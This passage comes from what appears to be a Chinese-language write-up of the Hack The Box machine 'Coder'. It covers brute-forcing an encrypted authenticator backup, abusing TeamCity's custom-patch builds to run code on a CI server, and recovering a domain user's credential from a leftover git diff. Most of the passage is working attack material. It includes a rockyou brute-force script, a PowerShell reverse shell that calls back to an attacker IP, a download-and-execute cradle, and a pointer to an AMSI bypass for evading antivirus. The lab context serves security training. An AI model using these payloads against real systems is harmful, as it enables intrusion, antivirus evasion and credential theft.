class="code"><pre><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line">  <span class="attr">&quot;hash1&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">    <span class="attr">&quot;dataType&quot;</span><span class="punctuation">:</span> <span class="string">&quot;EncOTPStorage&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;keyId&quot;</span><span class="punctuation">:</span> <span class="string">&quot;key1&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;data&quot;</span><span class="punctuation">:</span> <span class="string">&quot;U2FsdGVkX1+...（加密后的数据）&quot;</span></span><br><span class="line">  <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;key1&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">    <span class="attr">&quot;dataType&quot;</span><span class="punctuation">:</span> <span class="string">&quot;Key&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;encryptedKey&quot;</span><span class="punctuation">:</span> <span class="string">&quot;U2FsdGVkX1+...（加密后的密钥）&quot;</span></span><br><span class="line">  <span class="punctuation">&#125;</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure><p>这里我直接给出<code>key.enc</code>解密后的值为<code>mypassword</code></p><ul><li>首先先遍历这个json格式数据，遍历到<code>hash1</code>，发现是<code>EncOTPStorage</code>（即这是一个加密后的数据）</li><li>然后在整个json数据中遍历寻找<code>&quot;keyId&quot;: &quot;key1&quot;</code>，利用<code>mypassword</code>去解密<code>key1</code>中的<code>&quot;encryptedKey&quot;</code>，得到我们的密钥，假设为<code>myDecryptKey</code></li><li>然后利用<code>myDecryptKey</code>解密<code>&quot;data&quot;</code>字段的值</li></ul><p>我们现在需要做的就是尝试爆破解密后的<code>key.enc</code>，这里我们可以尝试rockyou字典，这里借用0xdf的<a href="https://0xdf.gitlab.io/2023/12/16/htb-coder.html#brute-force-password">脚本</a>，因为太菜了不会写nodejs</p><p>我们需要先安装<code>crypto-js</code></p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">npm i crypto-js</span><br></pre></td></tr></table></figure><p>然后保存下面的代码为<code>brute.js</code></p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> fs = <span class="built_in">require</span>(<span class="string">&#x27;fs&#x27;</span>)</span><br><span class="line"><span class="keyword">const</span> readline = <span class="built_in">require</span>(<span class="string">&#x27;readline&#x27;</span>)</span><br><span class="line"><span class="keyword">const</span> <span class="title class_">CryptoJS</span> = <span class="built_in">require</span>(<span class="string">&#x27;crypto-js&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> secret = <span class="string">&quot;U2FsdGVkX1+3JfFoKh56OgrH5jH0LLtc+34jzMBzE+QbqOBTXqKvyEEPKUyu13N2&quot;</span>;</span><br><span class="line"><span class="keyword">const</span> enc = <span class="string">&quot;U2FsdGVkX19dvUpQDCRui5XaLDSbh9bP00/1iBSrKp7102OR2aRhHN0s4QHq/NmYwxadLeTN7Me1a3LrVJ+JkKd76lRCnd1utGp/Jv6w0hmcsqdhdccOpixnC3wAnqBp+5QyzPVaq24Z4L+Rx55HRUQVNLrkLgXpkULO20wYbQrJYN1D8nr3g/G0ukrmby+1&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> rl = readline.<span class="title function_">createInterface</span>(&#123;</span><br><span class="line">    <span class="attr">input</span>: fs.<span class="title function_">createReadStream</span>(process.<span class="property">argv</span>[<span class="number">2</span>])</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line">rl.<span class="title function_">on</span>(<span class="string">&#x27;line&#x27;</span>, <span class="function">(<span class="params">line</span>) =&gt;</span> &#123;</span><br><span class="line">    <span class="keyword">var</span> key = <span class="title class_">CryptoJS</span>.<span class="property">AES</span>.<span class="title function_">decrypt</span>(enc, line).<span class="title function_">toString</span>();</span><br><span class="line">    <span class="keyword">var</span> result = <span class="title class_">CryptoJS</span>.<span class="property">AES</span>.<span class="title function_">decrypt</span>(secret, key).<span class="title function_">toString</span>();</span><br><span class="line">    <span class="keyword">var</span> seed = <span class="title class_">Buffer</span>.<span class="title function_">from</span>(result, <span class="string">&#x27;hex&#x27;</span>).<span class="title function_">toString</span>();</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (seed.<span class="property">length</span> &gt; <span class="number">10</span> &amp;&amp; <span class="regexp">/^[\x00-\x7F]*$/</span>.<span class="title function_">test</span>(seed)) &#123;</span><br><span class="line">        <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">`line: <span class="subst">$&#123;line&#125;</span>\nkey: <span class="subst">$&#123;key&#125;</span>\nresult: <span class="subst">$&#123;result&#125;</span>\nseed: <span class="subst">$&#123;seed&#125;</span>`</span>);</span><br><span class="line">        rl.<span class="title function_">close</span>();</span><br><span class="line">        process.<span class="title function_">exit</span>();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure><p>运行代码</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">node brute.js rockyou.txt</span><br></pre></td></tr></table></figure><p><img src="/2025/04/27/HTB-Machine-Coder/微信截图_20250402210829.png" alt="微信截图_20250402210829"></p><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">line: skyblade</span><br><span class="line">key: 3a3c2614b17654f9f15dce9dd282955e4f82e32dd0397fbb5b6730354a3dc6a7465091e1bea6fd465aa83743fbd9e630c9dff2c461da26737dc693d0d88623129b7c1a9342d0c88b406d7d542d4414ee4f13ee3e127d9ed0a124773d66e8af460d4347e3551dace0299452b898cc01396c6c4cc8ab967cad</span><br><span class="line">result: 504d32434736524f3733515437345753</span><br><span class="line">seed: PM2CG6RO73QT74WS</span><br></pre></td></tr></table></figure><p>那么这里的<code>skyblade</code>就是我们的加密备份文件的密码，我们利用上面提到的导入方式导入我们获得的验证器备份码文件</p><h3 id="导入备份码登入TeamCity"><a href="#导入备份码登入TeamCity" class="headerlink" title="导入备份码登入TeamCity"></a>导入备份码登入TeamCity</h3><p>如下图所示</p><p><img src="/2025/04/27/HTB-Machine-Coder/微信截图_20250402211602.png" alt="微信截图_20250402211602"></p><p>然后利用生成的验证码登录</p><p><img src="/2025/04/27/HTB-Machine-Coder/微信截图_20250402211703.png" alt="微信截图_20250402211703"></p><p>但是这里因为和靶机时间不同步的原因，导致我们的验证码无法正常使用，我们可以利用ntpdate进行时间同步，这里我选择使用faketime</p><p>先用ntpdate查看与域控相差的时间</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">2025-04-03 02:49:46.305998 (+0800) +19049.425767 +/- 0.123109 dc01.coder.htb 10.10.11.207 s1 no-leap</span><br></pre></td></tr></table></figure><p>然后用faketime打开chrome</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">faketime <span class="string">&quot;19049 seconds&quot;</span> google-chrome</span><br></pre></td></tr></table></figure><blockquote><p>这里还有一种获取2FA验证码的方式，利用解密出来下面json的明文</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&gt;<span class="attr">&quot;secret&quot;</span><span class="punctuation">:</span> <span class="string">&quot;U2FsdGVkX1+3JfFoKh56OgrH5jH0LLtc+34jzMBzE+QbqOBTXqKvyEEPKUyu13N2&quot;</span><span class="punctuation">,</span></span><br><span class="line">&gt;<span class="attr">&quot;issuer&quot;</span><span class="punctuation">:</span> <span class="string">&quot;TeamCity&quot;</span><span class="punctuation">,</span></span><br></pre></td></tr></table></figure><p>这里的<code>secret</code>就是我们上面解出来的seed的值<code>PM2CG6RO73QT74WS</code>，如下图所示两者是一样的</p><p><img src="/2025/04/27/HTB-Machine-Coder/image-20250402214623161.png" alt="image-20250402214623161"></p></blockquote><h2 id="获取立足点"><a href="#获取立足点" class="headerlink" title="获取立足点"></a>获取立足点</h2><p>我们在TeamCity的界面中发现一个Development_Testing的项目，我们在项目的参数中发现他构建的东西是我们之前在smb共享中下载的<code>teamcity_test_repo</code>这个存储库</p><p><img src="/2025/04/27/HTB-Machine-Coder/微信截图_20250402220519.png" alt="微信截图_20250402220519"></p><p>接下来我们看一下我们在TeamCity中的职位为Project developer</p><p><img src="/2025/04/27/HTB-Machine-Coder/微信截图_20250402220813.png" alt="微信截图_20250402220813"></p><p>点击permissions查看详细权限</p><p><img src="/2025/04/27/HTB-Machine-Coder/微信截图_20250402221152.png" alt="微信截图_20250402221152"></p><p>我们在图中发现了一个我们可以进行利用的权限：<strong>使用自定义补丁更改构建源代码</strong></p><p><strong>这意味着我们可以利用之前从SMB复制的Git仓库，将载荷合并到其中，提交差异文件作为补丁，并将其作为自定义任务运行。</strong></p><p>我们现在利用一个简单的网络请求载荷验证我们的猜想</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">echo</span> <span class="string">&#x27;iwr http://10.10.14.40&#x27;</span> &gt; hello_world.ps1</span><br></pre></td></tr></table></figure><p>之后获取编辑后的新脚本和原始脚本之间的差异，并将其保存到一个文件中</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git diff | <span class="built_in">tee</span> diff.txt</span><br></pre></td></tr></table></figure><p><img src="/2025/04/27/HTB-Machine-Coder/微信截图_20250402222528.png" alt="微信截图_20250402222528"></p><p>然后我们启动一个web服务器处理请求</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3 -m http.server 80  </span><br></pre></td></tr></table></figure><p>提交并运行我们的自定义构建</p><p><img src="/2025/04/27/HTB-Machine-Coder/微信截图_20250402222912.png" alt="微信截图_20250402222912"></p><p>注意这里选择<strong>run as a personal build</strong>并上传我们的diff文件，之后<strong>Run Build</strong></p><p><img src="/2025/04/27/HTB-Machine-Coder/微信截图_20250402223029.png" alt="微信截图_20250402223029"></p><p>可以看到和我们预想的一致，我们收到了来自CI/CD的请求</p><p><img src="/2025/04/27/HTB-Machine-Coder/微信截图_20250402223201.png" alt="微信截图_20250402223201"></p><p>我们尝试生成一个powershell反弹shell</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">powershell <span class="literal">-nop</span> <span class="literal">-c</span> <span class="string">&quot;<span class="variable">$client</span> = New-Object System.Net.Sockets.TCPClient(&#x27;10.10.14.22&#x27;,4444);<span class="variable">$stream</span> = <span class="variable">$client</span>.GetStream();[byte[]]<span class="variable">$bytes</span> = 0..65535|%&#123;0&#125;;while((<span class="variable">$i</span> = <span class="variable">$stream</span>.Read(<span class="variable">$bytes</span>, 0, <span class="variable">$bytes</span>.Length)) -ne 0)&#123;;<span class="variable">$data</span> = (New-Object -TypeName System.Text.ASCIIEncoding).GetString(<span class="variable">$bytes</span>,0, <span class="variable">$i</span>);<span class="variable">$sendback</span> = (iex <span class="variable">$data</span> 2&gt;&amp;1 | Out-String );<span class="variable">$sendback2</span> = <span class="variable">$sendback</span> + &#x27;PS &#x27; + (pwd).Path + &#x27;&gt; &#x27;;<span class="variable">$sendbyte</span> = ([text.encoding]::ASCII).GetBytes(<span class="variable">$sendback2</span>);<span class="variable">$stream</span>.Write(<span class="variable">$sendbyte</span>,0,<span class="variable">$sendbyte</span>.Length);<span class="variable">$stream</span>.Flush()&#125;;<span class="variable">$client</span>.Close()&quot;</span></span><br></pre></td></tr></table></figure><p>在我们的CI/CD界面显示我们上传的文件存在病毒，因此我们要尝试利用其他的反弹shell规避防病毒软件</p><p><img src="/2025/04/27/HTB-Machine-Coder/微信截图_20250402223928.png" alt="微信截图_20250402223928"></p><p>这里还是用一下之前能过杀软上线的反弹shell <strong>powershell-reverse-shell.ps1</strong>，这里建议分阶段执行</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">iwr http://10.10.14.40/shell.ps1 -outfile C:\windows\temp\shell.ps1; C:\windows\temp\shell.ps1</span><br></pre></td></tr></table></figure><p>shell.ps1</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">do</span> &#123;</span><br><span class="line">    <span class="comment"># Delay before establishing network connection, and between retries</span></span><br><span class="line">    <span class="built_in">Start-Sleep</span> <span class="literal">-Seconds</span> <span class="number">1</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># Connect to C2</span></span><br><span class="line">    <span class="keyword">try</span>&#123;</span><br><span class="line">        <span class="variable">$TCPClient</span> = <span class="built_in">New-Object</span> Net.Sockets.TCPClient(<span class="string">&#x27;10.10.14.22&#x27;</span>, <span class="number">4444</span>)</span><br><span class="line">    &#125; <span class="keyword">catch</span> &#123;&#125;</span><br><span class="line">&#125; <span class="keyword">until</span> (<span class="variable">$TCPClient</span>.Connected)</span><br><span class="line"></span><br><span class="line"><span class="variable">$NetworkStream</span> = <span class="variable">$TCPClient</span>.GetStream()</span><br><span class="line"><span class="variable">$StreamWriter</span> = <span class="built_in">New-Object</span> IO.StreamWriter(<span class="variable">$NetworkStream</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># Writes a string to C2</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">WriteToStream</span> <span class="params">(<span class="variable">$String</span>)</span></span> &#123;</span><br><span class="line">    <span class="comment"># Create buffer to be used for next network stream read. Size is determined by the TCP client recieve buffer (65536 by default)</span></span><br><span class="line">    [<span class="built_in">byte</span>[]]<span class="variable">$script:Buffer</span> = <span class="number">0</span>..<span class="variable">$TCPClient</span>.ReceiveBufferSize | % &#123;<span class="number">0</span>&#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment"># Write to C2</span></span><br><span class="line">    <span class="variable">$StreamWriter</span>.Write(<span class="variable">$String</span> + <span class="string">&#x27;SHELL&gt; &#x27;</span>)</span><br><span class="line">    <span class="variable">$StreamWriter</span>.Flush()</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment"># Initial output to C2. The function also creates the inital empty byte array buffer used below.</span></span><br><span class="line">WriteToStream <span class="string">&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Loop that breaks if NetworkStream.Read throws an exception - will happen if connection is closed.</span></span><br><span class="line"><span class="keyword">while</span>((<span class="variable">$BytesRead</span> = <span class="variable">$NetworkStream</span>.Read(<span class="variable">$Buffer</span>, <span class="number">0</span>, <span class="variable">$Buffer</span>.Length)) <span class="operator">-gt</span> <span class="number">0</span>) &#123;</span><br><span class="line">    <span class="comment"># Encode command, remove last byte/newline</span></span><br><span class="line">    <span class="variable">$Command</span> = ([<span class="type">text.encoding</span>]::UTF8).GetString(<span class="variable">$Buffer</span>, <span class="number">0</span>, <span class="variable">$BytesRead</span> - <span class="number">1</span>)</span><br><span class="line">    </span><br><span class="line">    <span class="comment"># Execute command and save output (including errors thrown)</span></span><br><span class="line">    <span class="variable">$Output</span> = <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="built_in">Invoke-Expression</span> <span class="variable">$Command</span> <span class="number">2</span>&gt;&amp;<span class="number">1</span> | <span class="built_in">Out-String</span></span><br><span class="line">        &#125; <span class="keyword">catch</span> &#123;</span><br><span class="line">            <span class="variable">$_</span> | <span class="built_in">Out-String</span></span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment"># Write output to C2</span></span><br><span class="line">    WriteToStream (<span class="variable">$Output</span>)</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment"># Closes the StreamWriter and the underlying TCPClient</span></span><br><span class="line"><span class="variable">$StreamWriter</span>.Close()</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>下面的红框中的Running一直在转就说明我们的shell已经正常执行了</p><p><img src="/2025/04/27/HTB-Machine-Coder/微信截图_20250403104706.png" alt="微信截图_20250403104706"></p><p>如下图所示，这就是我们的目标机器</p><p><img src="/2025/04/27/HTB-Machine-Coder/微信截图_20250403104937.png" alt="微信截图_20250403104937"></p><p>但是这个脚本不是很稳定，几分钟后就会掉，因为TeamCity在构建的时候如果长时间不能完成构建就会导致构建超时，我们在尝试其他的诸如混淆之类的规避方法时，可能存在构建失败的情况，这时我们可以通过<code>Build Log</code>查看原因</p><p><img src="/2025/04/27/HTB-Machine-Coder/微信截图_20250403105421.png" alt="微信截图_20250403105421"></p><p>我们还可以利用<a href="https://github.com/Karmaz95/evasion/blob/main/bamsi.txt">Github</a>上的工具关闭一下AMSI，操作和我们之前一样</p><p><img src="/2025/04/27/HTB-Machine-Coder/微信截图_20250403211801.png" alt="微信截图_20250403211801"></p><p>现在在关闭AMSI之后我们可以上传我们的未经混淆处理的一些powershell反弹shell，注意这里如果直接在hello_world中写反弹shell的脚本的话仍然不能成功，因为我们关闭的是Windows上的反病毒扫描接口，<strong>其实脚本在后边测试的时候并没有关闭AMSI</strong>，<img src="/2025/04/27/HTB-Machine-Coder/11114DA0.png" alt="11114DA0"></p><h2 id="横向移动"><a href="#横向移动" class="headerlink" title="横向移动"></a>横向移动</h2><p>枚举用户，我们的user flag应该存在于e.black用户桌面上，我们需要进行横向移动</p><p><img src="/2025/04/27/HTB-Machine-Coder/微信截图_20250403215249.png" alt="微信截图_20250403215249"></p><p>在隐藏目录<code>C:\programdata</code>下找到<code>JetBrains</code>的工作目录，我们进入<code>TeamCity</code>中寻找一下可利用的地方</p><p><img src="/2025/04/27/HTB-Machine-Coder/微信截图_20250403221707.png" alt="微信截图_20250403221707"></p><p>我们在<code>system</code>文件夹下找到每次构建时的更改文件<code>changes</code>，我们看一下除了我们在利用时上传的<code>diff.txt</code>文件是否还存在其他<code>diff.txt</code>文件是在靶机启动前就存在的</p><p><img src="/2025/04/27/HTB-Machine-Coder/微信截图_20250403222036.png" alt="微信截图_20250403222036"></p><p>经过我们的排除，发现<code>20</code>开头的<code>diff</code>文件均是我们自己构建时上传的，<code>101.changes.diff</code>这个文件十分可疑</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br></pre></td><td class="code"><pre><span class="line">diff --git a/Get-ADCS_Report.ps1 b/Get-ADCS_Report.ps1</span><br><span class="line">index d6515ce..a990b2e 100644</span><br><span class="line">--- a/Get-ADCS_Report.ps1</span><br><span class="line">+++ b/Get-ADCS_Report.ps1</span><br><span class="line">@@ -77,11 +77,15 @@ Function script:send_mail &#123;</span><br><span class="line">     [string]</span><br><span class="line">     <span class="variable">$subject</span></span><br><span class="line">   )</span><br><span class="line">+</span><br><span class="line">+<span class="variable">$key</span> = Get-Content <span class="string">&quot;.\key.key&quot;</span></span><br><span class="line">+<span class="variable">$pass</span> = (Get-Content <span class="string">&quot;.\enc.txt&quot;</span> | ConvertTo-SecureString -Key <span class="variable">$key</span>)</span><br><span class="line">+<span class="variable">$cred</span> = New-Object -TypeName System.Management.Automation.PSCredential (<span class="string">&quot;coder\e.black&quot;</span>,<span class="variable">$pass</span>)</span><br><span class="line"> <span class="variable">$emailFrom</span> = <span class="string">&#x27;pkiadmins@coder.htb&#x27;</span></span><br><span class="line"> <span class="variable">$emailCC</span> = <span class="string">&#x27;e.black@coder.htb&#x27;</span></span><br><span class="line"> <span class="variable">$emailTo</span> = <span class="string">&#x27;itsupport@coder.htb&#x27;</span></span><br><span class="line"> <span class="variable">$smtpServer</span> = <span class="string">&#x27;smtp.coder.htb&#x27;</span></span><br><span class="line">-Send-MailMessage -SmtpServer <span class="variable">$smtpServer</span> -To <span class="variable">$emailTo</span> -Cc <span class="variable">$emailCC</span> -From <span class="variable">$emailFrom</span> -Subject <span class="variable">$subject</span> -Body <span class="variable">$message</span> -BodyAsHtml -Priority High</span><br><span class="line">+Send-MailMessage -SmtpServer <span class="variable">$smtpServer</span> -To <span class="variable">$emailTo</span> -Cc <span class="variable">$emailCC</span> -From <span class="variable">$emailFrom</span> -Subject <span class="variable">$subject</span> -Body <span class="variable">$message</span> -BodyAsHtml -Priority High -Credential <span class="variable">$cred</span></span><br><span class="line"> &#125;</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line">diff --git a/enc.txt b/enc.txt</span><br><span class="line">new file mode 100644</span><br><span class="line">index 0000000..d352634</span><br><span class="line">--- /dev/null</span><br><span class="line">+++ b/enc.txt</span><br><span class="line">@@ -0,0 +1,2 @@</span><br><span class="line">+76492d1116743f0423413b16050a5345MgB8AGoANABuADUAMgBwAHQAaQBoAFMAcQB5AGoAeABlAEQAZgBSAFUAaQBGAHcAPQA9AHwANABhADcANABmAGYAYgBiAGYANQAwAGUAYQBkAGMAMQBjADEANAAwADkAOQBmADcAYQBlADkAMwAxADYAMwBjAGYAYwA4AGYAMQA3ADcAMgAxADkAYQAyAGYAYQBlADAAOQA3ADIAYgBmAGQAN</span><br><span class="line">+AA2AGMANQBlAGUAZQBhADEAZgAyAGQANQA3ADIAYwBjAGQAOQA1ADgAYgBjAGIANgBhAGMAZAA4ADYAMgBhADcAYQA0ADEAMgBiAGIAMwA5AGEAMwBhADAAZQBhADUANwBjAGQANQA1AGUAYgA2AGIANQA5AGQAZgBmADIAYwA0ADkAMgAxADAAMAA1ADgAMABhAA==</span><br><span class="line">diff --git a/key.key b/key.key</span><br><span class="line">new file mode 100644</span><br><span class="line">index 0000000..a6285ed</span><br><span class="line">--- /dev/null</span><br><span class="line">+++ b/key.key</span><br><span class="line">@@ -0,0 +1,32 @@</span><br><span class="line">+144</span><br><span class="line">+255</span><br><span class="line">+52</span><br><span class="line">+33</span><br><span class="line">+65</span><br><span class="line">+190</span><br><span class="line">+44</span><br><span class="line">+106</span><br><span class="line">+131</span><br><span class="line">+60</span><br><span class="line">+175</span><br><span class="line">+129</span><br><span class="line">+127</span><br><span class="line">+179</span><br><span class="line">+69</span><br><span class="line">+28</span><br><span class="line">+241</span><br><span class="line">+70</span><br><span class="line">+183</span><br><span class="line">+53</span><br><span class="line">+153</span><br><span class="line">+196</span><br><span class="line">+10</span><br><span class="line">+126</span><br><span class="line">+108</span><br><span class="line">+164</span><br><span class="line">+172</span><br><span class="line">+142</span><br><span class="line">+119</span><br><span class="line">+112</span><br><span class="line">+20</span><br><span class="line">+122</span><br></pre></td></tr></table></figure><p>我们这里解释一下Git中文件发生的变化：</p><p><strong>变化一：Get-ADCS_Report.ps1 文件的变化</strong></p><p>新增加了几行代码：</p><ul><li><code>Get-Content &quot;.\key.key&quot;</code>：从文件 <code>key.key</code> 中获取密钥</li><li><code>Get-Content &quot;.\enc.txt&quot; | ConvertTo-SecureString -Key $key</code>：从<code>enc.txt</code>中读取加密的字符串，并使用上一步获取的密钥进行解密，生成一个<code>SecureString</code>对象</li><li><code>$cred = New-Object -TypeName System.Management.Automation.PSCredential (&quot;coder\e.black&quot;,$pass)</code>：将解密后的字符串转换为 <code>PSCredential</code> 对象，和用户名<code>&quot;coder\e.black&quot;</code>一起构成完整的凭证信息</li></ul><p>修改了一出代码：</p><ul><li>原本的 <code>Send-MailMessage</code> 命令没有认证参数（<code>-Credential</code>），被修改为包含 <code>-Credential $cred</code>，使得发送邮件时使用经过解密的凭证进行身份验证</li></ul><p><strong>避免了将敏感信息（如明文密码）硬编码到脚本中</strong></p><p><strong>变化二：enc.txt文件新增</strong></p><p>这是加密后的数据</p><p><strong>变化三： key.key 文件新增</strong></p><p>这是密钥</p><p>那么现在我们就可以在我们自己的Windows上进行上面的操作，然后利用<code>(New-Object PSCredential $cred).GetNetworkCredential().Password</code>获取<code>coder\e.black</code>的网络凭据，完整过程为</p><p>还原enc.txt</p><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">76492d1116743f0423413b16050a5345MgB8AGoANABuADUAMgBwAHQAaQBoAFMAcQB5AGoAeABlAEQAZgBSAFUAaQBGAHcAPQA9AHwANABhADcANABmAGYAYgBiAGYANQAwAGUAYQBkAGMAMQBjADEANAAwADkAOQBmADcAYQBlADkAMwAxADYAMwBjAGYAYwA4AGYAMQA3ADcAMgAxADkAYQAyAGYAYQBlADAAOQA3ADIAYgBmAGQANAA2AGMANQBlAGUAZQBhADEAZgAyAGQANQA3ADIAYwBjAGQAOQA1ADgAYgBjAGIANgBhAGMAZAA4ADYAMgBhADcAYQA0ADEAMgBiAGIAMwA5AGEAMwBhADAAZQBhADUANwBjAGQANQA1AGUAYgA2AGIANQA5AGQAZgBmADIAYwA0ADkAMgAxADAAMAA1ADgAMABhAA==</span><br></pre></td></tr></table></figure><p>还原key.key</p><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line">144</span><br><span class="line">255</span><br><span class="line">52</span><br><span class="line">33</span><br><span class="line">65</span><br><span class="line">190</span><br><span class="line">44</span><br><span class="line">106</span><br><span class="line">131</span><br><span class="line">60</span><br><span class="line">175</span><br><span class="line">129</span><br><span class="line">127</span><br><span class="line">179</span><br><span class="line">69</span><br><span class="line">28</span><br><span class="line">241</span><br><span class="line">70</span><br><span class="line">183</span><br><span class="line">53</span><br><span class="line">153</span><br><span class="line">196</span><br><span class="line">10</span><br><span class="line">126</span><br><span class="line">108</span><br><span class="line">164</span><br><span class="line">172</span><br><span class="line">142</span><br><span class="line">119</span><br><span class="line">112</span><br><span class="line">20</span><br><span class="line">122</span><br></pre></td></tr></table></figure><p>在Windows上运行下面powershell命令</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$key</span> = <span class="built_in">Get-Content</span> <span 